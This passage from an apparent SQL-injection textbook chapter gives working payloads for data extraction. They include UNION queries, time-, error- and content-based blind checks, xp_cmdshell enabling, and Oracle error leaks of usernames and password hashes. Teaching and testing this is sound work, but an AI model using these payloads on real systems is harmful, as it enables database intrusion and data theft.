To proceed with the  following customer \nyou just need to add another condition that removes from the results the customers whose names have been already retrieved:  \nhttp://www.victim.com/products.asp?id=12+and+1=0+union+select+userid,first_name,second_name,\nNULL+from+customers+WHERE+userid+>+1  \nThis query will remove the original row (the one containing the product details) with the \nand 1=0 clause, and return the first row con taining a client with a userid value of more than 1. \nThis will result in the response shown in Figure 4.7. \n \nFigure 4.7  Looping through the Rows of a Table with UNION SELECT  \nFurther increasing the value of the userid  parameter will allow you to loop through the \nwhole table, extracting the full list of the customers of victim.com. \nUsing conditional statements  \nUsing UNION  to inject arbitrary queries is a fast and efficient method of extracting data. \nHowever, this is not always possible; Web applications, even when they are vulnerable, are not \nalways willing to give their data away so easily. Fortunately, several other techniques work equally well, albeit not always as quickly and easily. And even the most successful and spectacular “jackpot” of an SQL injection attack, usually consisting of dumping entire databases or obtaining interactive access to the database server, often begins by extracting pieces of data that are far smaller than what a UNION  statement can achieve. In several cases, \nthese pieces of data comprise just one bit of informa tion, because they are the outcome of \nqueries that have only two possible answers: “Yes” or “No.” Even if such queries allow such a minimal amount of data extraction, they are extremely powerful and are one of the deadliest  \nexploitation vectors available. Such queries can always be expressed in the following form:  \nIF condition THEN do_something ELSE do_something_else  \nDavid Litchfield and Chris Anley have extensively researched and developed this concept, \nand have authored several white papers on the topic. The general idea is to force the database to behave in different ways and return a different result depending on the specified condition. Such a condition could be the value of a specific bit of a specific byte of data (which we’ll \n\nexplore in more detail i n Chapter 5 ), but in the initial attack stages it usually deals with the \nconfiguration of the database. To begin with, however, let’s see how the same basic \nconditional statement translates in the syntax of the different database server technologies in Table 4.6.  \nTable 4.6  Conditional Statements  \nDatabase Server  Query \nMicrosoft SQL Server  IF (‘a’=‘a’) SELECT 1 ELSE SELECT 2  \nMySQL  SELECT IF(‘a’, 1, 2)  \nOracle  SELECT CASE WHEN ‘a’ = ‘a’ THEN 1 ELSE 2 END FROM DUAL  \n SELECT decode(substr(user,1,1),‘A’,1,2) FROM DUAL  \nPostgreSQL  SELECT CASE WHEN (1=1) THEN ‘a’ else ‘b’ END  \nApproach 1: Time -Based  \nA first possible approach in exploiting an SQL injection using conditional statements is based on different times that a Web application takes to respond, depending on the value of some piece of information. On SQL Server, for instance, one of the first things you might want to know is whether the user performing the queries is the system administrator account, sa . This \nis obviously important, because depending on your privileges you will be able to perform different actions on the remote database. Therefor e, you can inject the following query:  \nIF (system_user = ‘sa’) WAITFOR DELAY ‘0:0:5’ --  \nwhich translates into the following URL:  \nhttp://www.victim.com/products.asp?id=12;if+(system_user=‘sa’)+WAITFOR+DELAY+‘0:0:5’--  \nWhat happens here? system_user  is simply  a Transact -SQL (T -SQL) function that returns \nthe current login name (e.g. sa ). Depending on the value of system_user , the query will execute \nWAITFOR  (and will wait 5  s). By measuring the time it takes for the application to return the \nHTML page, you can d etermine whether you are sa. The two hyphens at the end of the query \nare used to comment out any spurious SQL code that might be present from the original query \nand that might interfere with your code.  \nThe value used ( 5, for 5  s) is arbitrary; you could ha ve used any other value between 1  s \n(WAITFOR DELAY ‘0:0:1’ ) and 24 h (well, almost, as WAITFOR DELAY ‘23:59:59’  is the \nlongest delay this command will accept). Five seconds was used because it is a reasonable balance between speed and reliability; a shorte r value would give us a faster response, but it \nmight be less accurate in the case of unexpected network delays or load peaks on the remote server.  \nOf course, you can replicate the same approach for any other piece of information in the \ndatabase, simply by  substituting the condition between parentheses. For instance, do you want \nto know whether the remote database version is 2005? Take a look at the following query:  \nIF (substring((select @@version),25,1) = 5) WAITFOR DELAY ‘0:0:5’ -- \nWe start by selecting t he @@version built-in variable, which, in an SQL Server 2005 \ninstallation, will look somewhat like the following:  \nMicrosoft SQL Server 2005 – 9.00.3042.00 (Intel X86)  \nFeb 9 2007 22:47:07  \nCopyright (c) 1988 –2005 Microsoft Corporation  \nStandard Edition on Win dows NT 5.2 (Build 3790: Service Pack 2)  \nAs you can see, this variable contains the database version. To understand whether the \nremote database is SQL Server 2005, you only need to check the last digit of the year, which happens to be the 25th character of that string. That same character will ob viously be different \nfrom “5” on other versions (e.g. it will be “0” on SQL Server 2000). Therefore, once you have this string you pass it to the substring()  function. This function is used to extract a part of a \nstring and takes three parameters: the orig inal string, the position where you must begin to \nextract, and the number of characters to extract. In this case, we extract only the 25th character and compare it to the value 5. If the two values are the same, we wait the usual 5  s. If the \napplication ta kes 5  s to return, we will be sure that the remote database is actually an SQL \nServer 2005 database.  \nSometimes, however, the product’s main version (2000, 2005, 2008, or 2012) is not enough, \nand you need to know the exact product version, because this can be very useful when you \nneed to know if a database server is missing a specific update and therefore whether it is vulnerable to a particular attack. For instance, we will probably want to know whether this instance of SQL Server 2005 has not been patched against MS09- 004 (“sp_replwritetovarbin” \nRemote Memory Corruption Vulnerability), which could allow us to escalate our privileges. For this information, all we need to do is to fingerprint the exact version. If SQL Server has been patched for that specific vulnerability, the product version is at least one of the following:  \n• SQL Server 2005 GDR 9.00.3077 \n• SQL Server 2005 QFE 9.00.3310 • SQL Server 2000 GDR 8.00.2055 • SQL Server 2000 QFE 8.00.2282 \nIt would only take a few requests to fingerprint the exact  version, and to discover that the \ndatabase administrator (DBA) of the SQL Server installation in our previous example forgot to \napply some updates. Now we know which attacks are likely to work.  \nTable 4.7 provides a ( partial) list of the releases of Microsoft SQL Server together with the \ncorresponding version numbers and information about some of the vulnerabilities that have \naffected the product.  \nTable 4.7  MS SQL Version Numbers  \nVersion  Produc t \n10.50.2500.0  SQL Server 2008 R2 SP1 \n10.50.1790 SQL Server 2008 R2 QFE (MS11- 049 patched)  \nVersion  Produc t \n10.50.1617 SQL Server 2008 R2 GDR (MS11- 049 patched)  \n10.50.1600.1  SQL Server 2008 R2 RTM  \n10.00.5500 SQL Server 2008 SP3 \n10.00.4311 SQL Server 2008 SP2 QFE (MS11- 049 patched)  \n10.00.4064 SQL Server 2008 SP2 GDR (MS11- 049 patched)  \n10.00.4000 SQL Server 2008 SP2 \n10.00.2841 SQL Server 2008 SP1 QFE (MS11- 049 patched)  \n10.00.2840 SQL Server 2008 SP1 GDR (MS11- 049 patched)  \n10.00.2531 SQL Server 2008 SP1 \n10.00.1600 SQL Server 2008 RTM  \n9.00.5292 SQL Server 2005 SP4 QFE (MS11- 049 patched)  \n9.00.5057 SQL Server 2005 SP4 GDR (MS11- 049 patched)  \n9.00.5000 SQL Server 2005 SP4 \nVersion  Produc t \n9.00.4340 SQL Server 2005 SP3 QFE (MS11- 049 patched)  \n9.00.4060 SQL Server 2005 SP3 GDR (MS11- 049 patched)  \n9.00.4035 SQL Server 2005 SP3 \n9.00.3310 SQL Server 2005 SP2 QFE (MS09- 004 patched)  \n9.00.3077 SQL Server 2005 SP2 GDR (MS09- 004 patched)  \n9.00.3042.01  SQL Server 2005 SP2a  \n9.00.3042 SQL Server 2005 SP2 \n9.00.2047 SQL Server 2005 SP1 \n9.00.1399 SQL Server 2005 RTM  \n8.00.2282 SQL Server 2000 SP4 QFE (MS09- 004 patched)  \n8.00.2055 SQL Server 2000 SP4 GDR (MS09- 004 patched)  \n8.00.2039 SQL Server 2000 SP4 \n8.00.0760 SQL Server 2000 SP3 \nVersion  Produc t \n8.00.0534 SQL Server 2000 SP2 \n8.00.0384 SQL Server 2000 SP1 \n8.00.0194 SQL Server 2000 RTM  \nAn updated and far more exhaustive list, complete with the exact release date of each \nnumber, is currently maintained by Bill Graziano and can be found at the address \nhttp://www.sqlteam.com/article/sql- server -versions . \nIf you have administrative privileges, you can use the xp_cmdshell  extended procedure to \ngenerate a delay by launching a command that takes a certain number of seconds to complete, as in the following example which will ping the loopback interface for 5 s:  \nEXEC master..xp_cmdshell ‘ping - n 5 127.0.0.1’  \nIf you have administrative access but xp_cmdshell  is not enabled, you can easily enable it \nwith the following commands on SQL Server 2005 and 2008:  \nEXEC sp_configure ‘show advanc ed options’, 1;  \nGO \nRECONFIGURE;  \nEXEC sp_configure ‘xp_cmdshell’,1;  \nOn SQL Server 2000, the following command is enough:  \nexec master..sp_addextendedproc ‘xp_cmdshell’,‘xplog70.dll’  \nMore information on xp_cmdshell  and how to enable it in various situations c an be found in \nChapter 6 . \nSo far, you have seen how to generate delays on SQL Server, but the same concept is \napplicable on other database technologies. For instance, on MySQL you can create a delay of a \nfew seconds with the following query:  \nSELECT BENCHMARK(1000000,sha1(‘blah’));  \nThe BENCHMARK  function executes the expression described by the second parameter for \nthe number of times specified by the first parameter. It is normally used to measure server performance, but it is also very useful for introducing an artificial delay. In this case, we tell \nthe database to calculate the SHA1 hash of the string “blah” 1  million times.  \nIf you are dealing with an installation of MySQL that is at least 5.0.12, things are even \neasier:  \nSELECT SLEEP(5);  \nIf you are against a PostgreSQL installatio n and its version is at least 8.2, you can use the \nfollowing instead:  \nSELECT pg_sleep(5);  \nFor older PostgreSQL databases, things are a bit more difficult, but if you have the \nnecessary privileges to create custom functions then you might have some luck wit h the \nfollowing technique shown by Nico Leidecker, which maps the underlying Unix operating system sleep  command:  \nCREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6’, ‘sleep’ language ‘C’ \nSTRICT; SELECT sleep(10);  \nRegarding Oracle, you can achieve the same effect (although less reliably) by generating an HTTP request to a “dead” Internet Protocol (IP) address, using UTL_HTTP  or HTTPURITYPE. \nIf you specify an IP address where no one is listening, the following queries will wait for the connection attempt to time out: \nselect utl_http.request (‘http://10.0.0.1/ ’) from dual;  \nselect HTTPURITYPE(‘http://10.0.0.1/’).getclob() from dual;  \nAn alternative to using the network timing approach is to use a simple Cartesian product. A \ncount(∗) on four tables takes much more time than returning a number. The following query \nreturns a number after counting all rows in a Cartesian product (which could become really big \nand time -intensive) if th e first character of the username is A : \nSELECT decode(substr(user,1,1),‘A’,(select count(∗ ) from \nall_objects,all_objects,all_objects,all_objects),0)  \nEasy, isn’t it? Well, keep reading, because things are going to get even more interesting.  \nApproach 2: Erro r-Based  \nThe time -based approach is extremely flexible, and it is guaranteed to work in very difficult \nscenarios because it uniquely relies on timing and not on the application output. For this reason, it is very useful in pure -blind scenarios, which we wil l analyze in depth in Chapter 5 . \nHowever, it is not suited to extracting more than a few bits of information. Assuming that \neach bit has the same probability of being 1 or 0, and assuming that we used 5 s as the parameter to WAITFOR , each query would take an average of 2.5 s (plus any additional \nnetwork delay) to return, making the process painstakingly slow. You could reduce the parameter passed to WAITFOR, but that would likely introduce errors. Luckily, we have in our \nbag other techniques that will trigger different responses depending on the value of the bit that we are looking for. Take a look at the following query:  \nhttp://www.victim.com/products.asp?id=12/is_srvrolemember(‘sysadmin’)  \nis_srvrolemember()  is an SQL Server T -SQL function that returns the following values:  \n• 1 if the user is part of the specified group.  \n• 0 if it is not part of the group.  \n• NULL  if the specified group does not exist.  \nIf our  user belongs to the sysadmin group, the id  parameter will be equal to 12/1, which is \nequal to 12, and the application will therefore return the old page describing the Syngress book. However, if the current user is not  a member of sysadmin, the i dparameter will have the \nvalue 12/0, which is obviously not a number. This will make the query fail, and the application \nwill return an error. The exact error message can obviously vary a lot: It could be simply a “500 Internal Server Error ” returned by the Web ser ver, or it might contain the full SQL \nServer error message, which will look like the screenshot in Figure 4.8.  \n \nFigure 4.8  Error Message as a Result of a Divide -by-Zero  \nIt might also be a generic HTML page that is used to make the application fail gracefully, \nbut the bottom line is the same: Depending on the value of a specific bit, you can trigger \ndifferent responses, and therefore extract the value of the bit itself.  \nYou can easily extend this principle to other types of queries, and for this purpose the CASE \nstatement is introduced, which is supported by the majority of database servers and can be injected inside an existing query, making it also available when stacked queries cannot be used. The CASE statement has the following syntax:  \nCASE WHEN condition THEN action1 ELSE action2 END  \nAs an example, let’s see how we can use a CASE statement to check, in our e -commerce \napplication, whether the current user is sa : \nhttp://www.victim.com/products.asp?id=12/(case+when+(system_user=‘sa’)+then+1+else+0+end)  \nApproach 3: Content -Based  \nA big advantage of the error -based approach, compared to WAITFOR , is speed: Each request \nreturns with a result immediately, independently fr om the value of the bit that you are \n\nextracting, as there are no delays involved. One disadvantage, however, is that it triggers a lot \nof errors, which might not always be desirable. Luckily, it is often possible to slightly modify the same technique to av oid the generation of errors. Let’s take the last URL and modify it \nslightly:  \nhttp://www.victim.com/products.asp?id=12%2B(case+when+(system_user+=+‘sa’)+then+1+else+0+end\n) \nThe only difference is that we substituted the “/” character after the parameter wit h %2B, \nwhich is the URL -encoded version of “+” (we can’t simply use a “+” in the URL, as it would \nbe interpreted as whitespace). The value of the id  parameter is therefore given by the following \nformula:  \nid = 12 + (case when (system_user = ‘sa’) then 1 else 0 end)  \nThe result is pretty straightforward. If the user performing the queries is not sa , then id=12 , \nand the request will be equivalent to:  \nhttp://www.victim.com/products.asp?id=12  \nOn the other hand, if the user performing the queries is sa , then id=13 and the request will \nbe equivalent to:  \nhttp://www.victim.com/products.asp?id=13  \nBecause we are talking about a product catalog, the two URLs will likely return two \ndifferent items: The first URL will still return the Syngress book, but the second might re turn, \nsay, a microwave oven. So, depending on whether the returned HTML contains the string Syngress  or the string oven , we will know whether our user is sa  or not.  \nThis technique is still as fast as the error -based one, but with the additional advantage t hat \nno errors are triggered, making this approach a lot more elegant.  \nWorking with Strings  \nYou might have noticed that in the previous examples the injectable parameter was always a number, and that we used some algebraic trick to trigger the different res ponses (whether \nerror -based or content -based). However, a lot of parameters vulnerable to SQL injection are \nstrings, not numbers. Luckily, you can apply the same approach to a string parameter, with just \na minor twist. Let’s assume that our e -commerce Web site has a function that allows the user \nto retrieve all the products that are produced by a certain brand, and that this function is called \nvia the following URL:  \nhttp://www.victim.com/search.asp?brand=acme  \nThis URL, when called, performs the following query in the back -end database:  \nSELECT ∗ FROM products WHERE brand = ‘ acme’ \nWhat happens if we slightly modify the brand parameter? Let’s say we substitute the m  with \nan l. The resultant URL will be the following:  \nhttp://www.victim.com/search.asp?brand=acle  \nThis URL will likely return something very different; probably an empty result set, or in any \ncase a very different one.  \nWhatever the exact result of the second URL is, if the brand parameter is injectable, it is \neasy to extract data by playing a bit with string concatenation. Let’s analyze the process step by step. The string to be passed as a parameter can obviously be split into two parts:  \nhttp://www.victim.com/search.asp?brand=acm‘%2B’e  \nBecause % 2B is the URL -encoded version of the plus sign, the resultant query (for \nMicrosoft SQL Server) will be the following:  \nSELECT ∗ FROM products WHERE brand = ‘ acm’+‘e’ \nThis query is obviously equivalent to the previous one, and therefore the resultant HTML \npage will not vary. We can push this one step further, and split the parameter into three parts \ninstead of two:  \nhttp://www.victim.com/search.asp?brand=ac‘%2B’m‘%2B’e  \nNow, the character m  in T-SQL can be expressed with the char()  function, which takes a \nnumber a s a parameter and returns the corresponding ASCII character. Because the ASCII \nvalue of m  is 109 (or 0x6D  in hexadecimal), we can further modify the URL as follows:  \nhttp://www.victim.com/search.asp?brand=ac‘%2Bchar(109)%2B’e  \nThe resultant query will theref ore become:  \nSELECT ∗ FROM products WHERE brand = ‘ ac’+char(109)+‘ e’ \nAgain, the query will still return the same results, but this time we have a numeric parameter \nthat we can play with, so we can easily replicate what we saw in the previous section by \nsubm itting the following request:  \nhttp://www.victim.com/search.asp?brand=ac‘%2Bchar(108%2B(case+when+(system_user+=+‘sa’)+then\n+1+else+0+end)%2B’e  \nIt looks a bit complicated now, but let’s see what is going on in the resultant query:  \nSELECT ∗ FROM products WHERE brand = ‘ac’+char(108+(case when+(system_user=‘sa’) then 1 else \n0 end) + ‘e’  \nDepending on whether the current user is sa  or not, the argument of char()  will be 109 or \n108, respectively, returning therefore m  or l. In the former case, the string resulting  from the \nfirst concatenation will be acme, whereas in the second it will be acle. Therefore, if the user is sa the last URL is equivalent to the following:  \nhttp://www.victim.com/search.asp?brand=acme  \nOtherwise, the URL will be equivalent to the following:  \nhttp://www.victim.com/search.asp?brand=acle  \nBecause the two pages return different results, here we have a safe method for extracting \ndata using conditional statements for string parameters as well.  \nExtending the Attack  \nThe examples we’ve covered so far are focused on retrieving pieces of information that can have only two possible values —for example, whether the user is the database administrator or \nnot. However, you can easily extend this technique to arbitrary data. Obviously, because conditional statements by definition can retrieve only one bit of information (as they can infer only whether a condition is true or false), you will need as many connections as the number of bits composing the data in which you are interested. As an example let’s return to the user who \nperforms the queries. Instead of limiting ourselves to check whether the user is sa , let’s \nretrieve the user’s whole name. The first thing to do is to discover the length of the username. \nYou can do that using the following query:  \nselect len(system_user)  \nAssuming that the username is appdbuser , this query will return the value 9. To extract this \nvalue using conditional statements, you need to perform a binary search. Assuming that you use the error -based method that was illustrated a few pages  ago, the following URLs will be \nsent:  \nhttp://www.victim.com/products.asp?id=10/(case+when+(len(system_user)+>+8)+then+1+else+0+end\n) \nBecause our username is longer than eight characters, this URL will not generate an error. \nWe continue with our binary sear ch with the following queries:  \nhttp://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+16)+then+1+else+0+en\nd) --->Error  \nhttp://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+12)+then+1+else+0+en\nd) --->Error  \nhttp://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+10)+then+1+else+0+en\nd) --->Error  \nhttp://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+9)+then+1+else+0+end\n) --->Error  \nDone! Because the (len(system_user) > 8)  condit ion is true and the (len(system_user) > 9)  \ncondition is false, we know that our username is nine characters long.  \nNow that we know the length of the username, we need to extract the characters that \ncompose the username. To perform this task we will cycle t hrough the various characters, and \nfor each of them we will perform a binary search on the ASCII value of the letter itself. On SQL Server, to extract a specific character and calculate its ASCII value you can use the following expression:  \nascii(substring((select system_user),1,1))  \nThis expression retrieves the value of system_user , extracts a substring that starts from the \nfirst character and that is exactly one character long, and calculates its decimal ASCII value. \nTherefore, the following URLs will be used:  \nhttp://www.victim.com/products.asp?id=12/(case+when+(ascii(substring(select+system_user),1,1\n))+>+64)+then+1+else+0+end) --->Ok \nhttp://www.victim.com/products.asp?id=12/(case+when+(ascii(substring(select+system_user),1,1\n))+>+128)+then+1+else+0+end) --->Error  \nhttp://www.victim.com/products.asp?id=12/(case+when+(ascii(substring(select+system_user),1,1\n))+>+96)+then+1+else+0+end) --->Ok \n<etc.>  \nThe binary search will continue until the character a (ASCII: 97 or 0x61) is found. At that \npoint, the procedure wi ll be repeated for the second character, and so on. You can use the same \napproach to extract arbitrary data from the database, but it is very easy to see that this technique requires a large number of requests in order to extract any reasonable amount of information. Several free tools can automate this process, but nevertheless this approach is not \nrecommended for extracting large amounts of data such as entire databases.  \nUsing Errors for SQL Injection  \nYou have already seen that in a non -blind SQL injectio n scenario database errors are very \nhelpful in providing the attacker with the information necessary to craft correct arbitrary queries. You also discovered that, once you know how to craft correct queries, you can leverage error messages to retrieve infor mation from the database, by using conditional \nstatements that allow you to extract one bit of data at a time. However, in some cases error messages can also be used for much faster data extraction. Earlier in the chapter, we used an error message to discl ose the SQL Server version by injecting the string @@version where a \nnumeric value was expected, generating an error message with the value of the @@version  \nvariable. This works because SQL Server produces far more verbose error messages compared to other databases. Well, this feature can be abused to extract arbitrary information from the database, and not just its version. For instance, we might be interested in knowing which database user performs the query on the database server:  \nhttp://www.victim.com/p roducts.asp?id=system_user  \nRequesting this URL will generate the following error:  \nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’  \n[Microsoft][ODBC SQL Server Driver][SQL Server]Conversion failed when  \nconverting the nvarchar value ‘appdbuser’ to data type int.  \n/products.asp, line 33  \nYou already saw how to determine whether our user belongs to the sysadmin group, but let’s \nsee another way to get the same information using this error message, by using the value \nreturned by is_srvrolemember  to gener ate the string that will trigger the cast error:  \nhttp://www.victim.com/products.asp?id=char(65%2Bis_srvrolemember(‘sysadmin’))  \nWhat is happening here? The number 65 is the decimal ASCII value of the character A , and \n%2B is the URL -encoded version of the “+ ” sign. If the current user does not belong to the \nsysadmin group, is_srvrolemember  will return 0, and char(65+0)  will return the A  character. On \nthe other hand, if the current user has administrative privileges, is_srvrolemember  will return 1, \nand char(66)  will return B, again triggering the casting error. Trying the query, we receive the \nfollowing error:  \nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’  \n[Microsoft][ODBC SQL Server Driver][SQL Server]Conversion failed when  \nconverting the nvarchar value ‘B’ to data type int.  \n/products.asp, line 33  \nIt appears as though we have a B, which means that our database user has administrative \nprivileges! You can consider this last attack as a sort of hybrid between content -based \nconditional injection and error -based conditional injection. As you can see, SQL injection \nattacks can come in s o many forms that it’s impossible to capture all of them in one book, so \ndon’t forget to use your creativity. Being able to think out of the box is the key skill of a successful penetration tester.  \nAnother error -based method that allows an attacker to enum erate the names of the columns \nbeing used in the current query is provided by the HAVING  clause. This clause is normally \nused in conjunction with GROUP BY  to filter the results returned by a SELECT  statement. \nHowever, on SQL Server you can use it to genera te an error message that will contain the first \ncolumn of the query, as in the following URL:  \nhttp://www.victim.com/products.asp?id=1+having+1=1  \nThe application returns the following error:  \nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e14’  \n[Microsoft][ODBC SQL Server Driver][SQL Server]Column ‘products.id’ is  \ninvalid in the select list because it is not contained in either an  \naggregate function or the GROUP BY clause.  \n/products.asp, line 233  \nThe error message contains the names of the products  table and of the id  column, which is \nthe first column used in the SELECT . To move to the second column, we simply need to add a \nGROUP BY  clause with the name of the column we just discovered:  \nhttp://www.victim.com/products.asp?id=1+group+by+products.id+having+1=1  \nWe now receive another error message:  \nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e14’  \n[Microsoft][ODBC SQL Server Driver][SQL Server]Column ‘products.name’ is  \ninvalid in the select list because it is not contained in either an  \naggregate function or the GROUP BY clause.  \n/shop.asp, line 233  \nBecause the first column is now part of the GROUP BY  clause, the error is triggered by the \nsecond column: products.name . The next step is to add this column to the GROUP BY  without \nremoving the previous one:  \nhttp://www.victim.com/shop.asp?item=1+group+by+products.id,products.name+having+1=1  \nBy simply repeating this procedure until we get no more errors, we can easily enumerate all \ncolumns. \nTip \nAs you can see from the examples so far, verbose error messages can be extremely useful to an attacker. If you \nare responsible for a Web application, make sure it is configured so that when something goes wrong it returns \nonly a custom HTML page that contains a very generic error message for the users. Detailed error m essages \nshould be available only to the developers and administrators of a Web application.  \nError Messages in Oracle  \nOracle also offers the possibility of extracting data via error messages. Depending on the \ndatabase version, different PL/SQL functions in Oracle make it is possible to control the content of the error message. The best -known function is utl_inaddr . This function is \nresponsible for the name resolution of hosts:  \nSQL> select utl_inaddr.get_host_name(‘victim’) from dual;  \nORA-29257: host victim unknown  \nORA-06512: at “SYS.UTL_INADDR”, line 4  \nORA-06512: at “SYS.UTL_INADDR”, line 35  \nORA-06512: at line 1  \nIn this case, it is possible to control the content of the error message. Whatever is passed to \nthe function is printed in the error message.  \nIn Ora cle, you can replace every value (e.g. a string) with a SELECT  statement. The only \nlimitation is that this SELECT  statement must return exactly one column and one row. If not, \nyou will get the error message ORA -01427: single -row subquery returns more than one row . \nThis can be used as in the following examples from the SQL ∗Plus command line:  \nSQL> select utl_inaddr.get_host_name( (select username||‘=’||password from dba_users where \nrownum=1)) from dual;  \nORA-29257: host SYS=D4DF7931AB130E37 unknown  \nORA-06512: at “SYS.UTL_INADDR”, line 4  \nORA-06512: at “SYS.UTL_INADDR”, line 35  \nORA-06512: at line 1  \nSQL> select utl_inaddr.get_host_name((select banner from v$version where rownum=1)) from \ndual;  \nORA-29257: host ORACLE DATABASE 10G RELEASE 10.2.0.1.0 –  64BIT PRODUCTION unknown  \nORA-06512: at “SYS.UTL_INADDR”, line 4  \nORA-06512: at “SYS.UTL_INADDR”, line 35  \nORA-06512: at line 1  \nThe utl_inaddr.get_host_name  function can now be injected into a vulnerable URL. In Figure \n4.9, the error me ssage contains the current date of the database.  \n \nFigure 4.9  Returning the Date in an Error Message  \n\nNow we have the tools necessary to retrieve data from every accessible table, through the \nuse of an injected string such as:  \n‘ or 1=utl_inaddr.get_host_name((INNER))–  \nWe just replace the inner SELECT  statement with a statement returning a single column and  a \nsingle row. To bypass the limitation of the single column it is possible to concatenate multiple \ncolumns together.  \nThe following query returns the name of a user plus his password. Both columns are \nconcatenated:  \nselect username||‘=’||password from (sele ct rownum r,username,password from dba_users) where \nr=1 \nORA-29257: host SYS=D4DF7931AB130E37 unknown  \nTo avoid single quotes in the concatenated string it is possible to use the concat  function \ninstead:  \nselect concat(concat(username,chr(61)),password) from (select rownum r,  \nusername,password from dba_users) where r=2  \nORA-29257: host SYSTEM=E45049312A231FD1 unknown  \nIt is also possible to bypass the one -row limitation to get multiple rows of information. By  \nusing a special SQL statement with XML or the special Oracle function  stragg (11g+) , it is \npossible to get all rows in one single row. The only limitation is the size of the output (4000 bytes) in both approaches:  \nselect xmltransform(sys_xmlagg(sys_xmlgen (username)),xmltype(‘<?xml \nversion=“1.0”?><xsl:stylesheet version=“1.0” \nxmlns:xsl=“http://www.w3.org/1999/XSL/Transform”><xsl:template match=“/”><xsl:for- each \nselect=”/ROWSET/USERNAME”><xsl:value- of select=“text()”/>;</xsl:for -\neach></xsl:template></xsl:stylesheet>’)).getstringval() listagg from all_users;  \nselect sys.stragg (distinct username||‘;’) from all_users  \nOutput:  \nALEX;ANONYMOUS;APEX_PUBLIC_USER;CTXSYS;DBSNMP;DEMO1;DIP;DUMMY;EXFSYS;FLOWS_030000; \nFLOWS_FILES;MDDATA;MDSYS;MGMT_VIEW;MONODEMO;OLAPSYS;ORACLE_OCM;ORDPLUGINS;ORDSYS; \nOUTLN;OWBSYS;PHP;PLSQL;SCOTT;SI_INFORMTN_SCHEMA;SPATIAL_CSW_ADMIN_USR;SPATIAL_WFS_ADMIN_USR;SYS;SYSMAN;SYSTEM;TSMSYS;WKPROXY;WKSYS;WK_TEST;WMSYS;X;XDB;XS$NULL;\n \nInjecting one of the queries together with utl_inaddr  throws an error message containing all \nusernames, as shown in Figure 4.10.  \n \nFigure 4.10  Returning Multiple Rows  \nBy default, Oracle 11g restricts access to utl_inaddr  and all other network packages with a \nnewly introduced access control list (ACL) system. In this case, we will get an ORA -24247: \nnetwork access denied by access control list  (ACL) error message without data in it.  \nIn this case, or if the database was hardened and the PUBLIC grant was revoked from \nutl_inaddr , we must use other functions. The following Oracle functions (granted to PUBLIC) \nreturn error- controllable messages.  \nInjecting the following: \nOr 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user,‘a’,‘b’)--  \n\nreturns the following:  \nORA-53044: invalid tag: VICTIMUSER  \nInjecting the following: \nor 1=SYS.DBMS_AW_XML.READAWMETADATA(user,‘a’)--  \nreturns the following:  \nORA-29532: Java call terminated by uncaught Java exception: oracle.AWXML.AWException: \noracle.AWXML.AWException: An error has occurred on the server  \nError clas s: Express Failure  \nServer error descriptions:  \nENG: ORA- 34344: Analytic workspace VICTIMUSER is not attached.  \nInjecting the following: \nOr 1= CTXSYS.CTX_QUERY.CHK_XPATH(user,‘a’,‘b’)--  \nreturns the following:  \nORA-20000: Oracle Text error:  \nDRG-11701: thesaurus VICTIMUSER does not exist  \nORA-06512: at “CTXSYS.DRUE”, line 160  \nORA-06512: at “CTXSYS.DRITHSX”, line 538  \nORA-06512: at line 1  \nEnumerating the database schema  \nYou have seen a number of different techniques for extracting data from the r emote database. \nTo illustrate these techniques, we have retrieved only small pieces of information, so now it’s \ntime to extend our scope and see how to use these techniques to obtain larger amounts of data. After all, databases can be huge beasts, containi ng several terabytes of data. To mount a \nsuccessful attack, and to properly assess the risk that is posed by an SQL injection \nvulnerability, performing a fingerprint and squeezing a few bits of information is not enough: You must show that a skilled and re sourceful attacker is able to enumerate the tables that are \npresent in the database and quickly extract the ones that he is interested in. In this section, a few examples will be illustrated of how you can obtain a list of all databases that are installed on the remote server, a list of all tables of each of those databases, and a list of all columns for each of those tables —in short, how to enumerate the database schema. We will perform this \nattack by extracting some of the metadata that databases use to o rganize and manage the \ndatabases they store. In the examples, we will mostly use UNION  queries, but you obviously \ncan extend the same concepts to all other SQL injection techniques.  \nTip \nTo enumerate the tables/columns that are present on the remote databas e, you need to access specific tables that \ncontain the description of the structure of the various databases. This information is usually called metadata  \n(which means “data about other data”). An obvious precondition for this to succeed is that the user performing the \nqueries must be authorized to access such metadata, and this might not always be the case. If the enumeration \nphase fails, you might have to escalate your privileges to a more powerful user. We will discuss some privilege \nescalation techniques  later in this chapter.  \nSQL Server  \nLet’s go back to our e -commerce application, with our vulnerable ASP page that returns the \ndetails of a specific article. As a reminder, the page is called with a URL such as the following:  \nhttp://www.victim.com/products.asp?id=12  \nThis URL returns a page similar to the one previously shown in Figure 4.1, with a nice table \nwith four fields containing both strings and numeric values. The first piece of information that \nwe usually want to extract is a list of the databases that are installed on the remote server. Such \ninformation is stored in the master..sy sdatabases  table, and the list of names can be retrieved \nwith the following query:  \nselect name from master..sysdatabases  \nWe therefore start by requesting the following URL:  \nhttp://www.victim.com/products.asp?id=12+union+select+null,name,null,null+from+master..sysda\ntabases  \nThe result will be the page shown in Figure 4.11.  \n \nFigure 4.11  Using UNION to Enumerate All Databases Installed on the Remote Database Server  \nNot bad for a start! The remote application dutifully provided us with the list of the \ndatabases. The master  database is obviously one of the most interesting, since it contains the \nmetadata that describes all other databases (including the sysdatabases  table we just queried!). \nThe e-shop database also looks very promising, as it’s probably the one that contains all the \ndata used by this e -commerce application, includi ng all customer data. The other databases on \nthis list are shipped by default with SQL Server, and therefore are less interesting. If this query \nreturns a large number of databases and you need to precisely identify which one is being used by the applicati on you are testing, the following query can help you:  \nSELECT DB_NAME()  \n\nNow that we have the name of the databases, it’s time to start enumerating the tables that \ncompose them and that contains the data we are looking for. Each database has a table called \nsysobjects  that contains exactly that information. It also contains a lot more data we’re not \nnecessarily interested in, and therefore we need to focus on user -defined objects by specifying \nthat we are only interested in the rows where the type is U . Assum ing that we want to delve a \nlittle deeper into the contents of the e -shop database, here’s the query to inject:  \nSELECT name FROM e -shop..sysobjects WHERE xtype=‘U’  \nThe 